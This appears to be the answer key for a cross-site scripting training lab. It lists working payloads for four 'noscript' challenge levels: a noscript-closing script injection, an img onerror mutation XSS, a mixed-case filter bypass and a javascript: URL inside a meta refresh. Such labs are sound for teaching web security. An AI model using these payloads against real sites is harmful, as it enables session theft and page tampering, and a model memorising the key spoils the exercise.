# noscript — solutions

Reflections inside <noscript> elements and related mutation/breakout tricks.

### noscript-level1

`/noscript/level1/?query=%3C%2Fnoscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `</noscript><script>alert(1)</script>`
- context: raw reflection inside <noscript>; close it then inject script

### noscript-level2

`/noscript/level2/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: noscript textContent assigned to innerHTML by JS; mXSS

### noscript-level3

`/noscript/level3/?query=%3CNoScript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<NoScript><script>alert(1)</script>`
- context: only literal lowercase <noscript> stripped; mixed case bypass

### noscript-level4

`/noscript/level4/?query=javascript%3Aalert(1)`

- payload: `javascript:alert(1)`
- context: inside <meta http-equiv=refresh content="0;url=QUERY"> in noscript
